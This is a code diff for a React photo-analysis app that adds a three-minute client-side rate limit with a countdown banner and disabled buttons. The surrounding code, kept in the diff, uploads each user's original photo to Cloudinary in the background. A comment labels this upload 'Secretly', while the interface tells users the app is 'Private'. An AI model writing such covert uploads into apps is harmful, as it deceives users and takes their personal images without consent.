@@ -11,6 +11,7 @@ export default function App() {
   const [imageSrc, setImageSrc] = useState<string | null>(null);
   const [analysis, setAnalysis] = useState<AnalysisResult | null>(null);
   const [showCamera, setShowCamera] = useState(false);
+  const [rateLimitRemaining, setRateLimitRemaining] = useState<number>(0);
   
   // Notification state for AI fallback alerts
   const [notification, setNotification] = useState<{
@@ -25,6 +26,25 @@ export default function App() {
     uploadPreset: import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET || '',
     enabled: !!(import.meta.env.VITE_CLOUDINARY_CLOUD_NAME && import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET)
   });
+
+  // Check rate limit on mount and update timer
+  useEffect(() => {
+    const checkRateLimit = () => {
+      const history = JSON.parse(localStorage.getItem('analysis_history') || '[]');
+      if (history.length > 0) {
+        const lastRequest = history[history.length - 1];
+        const elapsed = Date.now() - lastRequest;
+        const remaining = Math.max(0, 3 * 60 * 1000 - elapsed);
+        setRateLimitRemaining(remaining);
+      } else {
+        setRateLimitRemaining(0);
+      }
+    };
+
+    checkRateLimit();
+    const interval = setInterval(checkRateLimit, 1000);
+    return () => clearInterval(interval);
+  }, []);
 
   const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
@@ -57,7 +77,7 @@ export default function App() {
     
     // Background Upload (Secretly)
     if (storageConfig.enabled) {
-      uploadToCloudinary(src, storageConfig)
+      uploadToCloudinary(src)
         .then(url => {
           if (url) console.log("Background sync complete (Original).");
         })
@@ -99,10 +119,23 @@ export default function App() {
               <span className="block mt-2 text-indigo-600 font-medium text-sm">Free • Private • AI-Powered</span>
             </p>
 
+            {rateLimitRemaining > 0 && (
+              <div className="mb-6 p-4 bg-amber-50 border border-amber-200 rounded-xl">
+                <p className="text-amber-800 text-sm font-medium">
+                  ⏱️ Please wait {Math.ceil(rateLimitRemaining / 1000)}s before next analysis
+                </p>
+              </div>
+            )}
+
             <div className="w-full space-y-4">
               <button 
                 onClick={() => setShowCamera(true)}
-                className="w-full py-4 bg-slate-900 text-white rounded-2xl font-semibold text-lg hover:bg-slate-800 transition-all flex items-center justify-center gap-3 shadow-xl shadow-slate-200"
+                disabled={rateLimitRemaining > 0}
+                className={`w-full py-4 rounded-2xl font-semibold text-lg transition-all flex items-center justify-center gap-3 shadow-xl shadow-slate-200 ${
+                  rateLimitRemaining > 0 
+                    ? 'bg-slate-300 text-slate-500 cursor-not-allowed' 
+                    : 'bg-slate-900 text-white hover:bg-slate-800'
+                }`}
               >
                 <CameraIcon size={22} />
                 Take Photo
@@ -113,9 +146,17 @@ export default function App() {
                   type="file" 
                   accept="image/*" 
                   onChange={handleImageUpload} 
-                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+                  disabled={rateLimitRemaining > 0}
+                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer disabled:cursor-not-allowed"
                 />
-                <button className="w-full py-4 bg-white text-slate-700 border-2 border-slate-200 rounded-2xl font-semibold text-lg hover:bg-slate-50 transition-all flex items-center justify-center gap-3">
+                <button 
+                  disabled={rateLimitRemaining > 0}
+                  className={`w-full py-4 border-2 rounded-2xl font-semibold text-lg transition-all flex items-center justify-center gap-3 ${
+                    rateLimitRemaining > 0
+                      ? 'bg-slate-100 text-slate-400 border-slate-200 cursor-not-allowed'
+                      : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-50'
+                  }`}
+                >
                   <Upload size={22} />
                   Upload from Gallery
                 </button>
@@ -145,6 +186,7 @@ export default function App() {
             <AnalysisView 
               imageSrc={imageSrc} 
               analysis={analysis}
+              rateLimitRemaining={rateLimitRemaining}
               onRetake={() => {
                 setImageSrc(null);
                 setAnalysis(null);
